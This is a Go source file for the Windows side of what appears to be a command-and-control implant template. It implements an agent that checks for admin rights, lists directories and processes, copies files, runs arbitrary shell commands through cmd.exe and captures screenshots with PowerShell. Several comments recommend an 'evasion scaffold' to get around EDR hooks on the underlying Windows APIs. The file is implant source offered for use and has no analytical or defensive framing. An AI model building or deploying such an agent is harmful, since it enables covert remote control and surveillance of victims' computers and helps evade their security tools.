//go:build windows

package impl

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"__NAME__/protocol"
)

// ═══════════════════════════════════════════════════════════════════════════════
// Platform-specific implementations for Windows.
// ═══════════════════════════════════════════════════════════════════════════════

// ─── Platform ──────────────────────────────────────────────────────────────────

// GetCP returns the system code page.
// TODO: Implement via evasion gate or direct API call.
// Typical approach: kernel32.GetACP (hooked by EDR — use evasion scaffold).
func (a *Agent) GetCP() uint32 {
	out, err := exec.Command("cmd", "/C", "chcp").Output()
	if err != nil {
		return 0
	}
	fields := strings.Fields(string(out))
	for i := len(fields) - 1; i >= 0; i-- {
		if n, err := strconv.Atoi(strings.Trim(fields[i], ".\r\n")); err == nil {
			return uint32(n)
		}
	}
	return 0
}

// IsElevated returns true if running with admin privileges.
// TODO: Implement via evasion gate or direct API call.
// Typical approach: OpenProcessToken + GetTokenInformation (hooked by EDR).
func (a *Agent) IsElevated() bool {
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", "[bool](([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))")
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.EqualFold(strings.TrimSpace(string(out)), "True")
}

// GetOsVersion returns a human-readable OS version string.
// TODO: Implement via evasion gate or direct API call.
// Typical approach: ntdll.RtlGetVersion (hooked by EDR — use evasion scaffold).
func (a *Agent) GetOsVersion() string {
	out, err := exec.Command("cmd", "/C", "ver").Output()
	if err != nil {
		return "Windows"
	}
	return strings.TrimSpace(string(out))
}

// NormalizePath converts a path to its canonical Windows form.
func (a *Agent) NormalizePath(path string) string {
	if path == "" {
		return path
	}
	path = strings.ReplaceAll(path, "/", "\\")
	if strings.HasPrefix(path, "~") {
		home, err := os.UserHomeDir()
		if err == nil {
			path = home + path[1:]
		}
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return path
	}
	return filepath.Clean(abs)
}

// ─── FileSystem ────────────────────────────────────────────────────────────────

// GetListing returns the absolute path and directory entries for the given path.
// TODO: Implement — DirEntry fields are protocol-dependent.
// Use os.ReadDir + e.Info() to populate the protocol.DirEntry struct
// with the fields defined by your protocol overlay.
func (a *Agent) GetListing(path string) (string, []protocol.DirEntry, error) {
	return listDirEntries(path)
}

// CopyFile copies a single file from src to dst.
func (a *Agent) CopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// CopyDir recursively copies a directory from src to dst.
func (a *Agent) CopyDir(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := a.CopyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := a.CopyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}
	return nil
}

// ─── Execution ─────────────────────────────────────────────────────────────────

// RunShell executes a command via the system shell.
// TODO: Implement via evasion gate or direct API call.
// Typical approach: CreateProcess with pipes (hooked by EDR — use evasion scaffold).
func (a *Agent) RunShell(cmd string, output bool, wait bool) (string, error) {
	return runShellCommand("cmd.exe", []string{"/C", cmd}, output, wait)
}

// ListProcesses returns a snapshot of running processes.
// TODO: Implement via evasion gate or direct API call.
// Typical approach: NtQuerySystemInformation or CreateToolhelp32Snapshot (hooked by EDR).
func (a *Agent) ListProcesses() ([]protocol.ProcessEntry, error) {
	out, err := exec.Command("tasklist", "/fo", "csv", "/nh").Output()
	if err != nil {
		return nil, err
	}
	return parseWindowsTasklist(out)
}

// CaptureScreenshot takes a screenshot and returns PNG bytes.
// TODO: Implement via evasion gate or direct API call.
// Typical approach: GDI+ BitBlt (hooked by EDR — use evasion scaffold).
func (a *Agent) CaptureScreenshot() ([]byte, error) {
	return captureScreenshotAttempts(
		screenshotAttempt{
			name: "powershell-gdi",
			fn: func() ([]byte, error) {
				return captureScreenshotFromTempFile(
					"powershell",
					"-NoProfile",
					"-NonInteractive",
					"-Command",
					"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $bounds.Width,$bounds.Height; $graphics=[System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Left,$bounds.Top,0,0,$bmp.Size); $bmp.Save('"+singleQuotedPowerShellPath("{out}")+"',[System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose()",
				)
			},
		},
	)
}
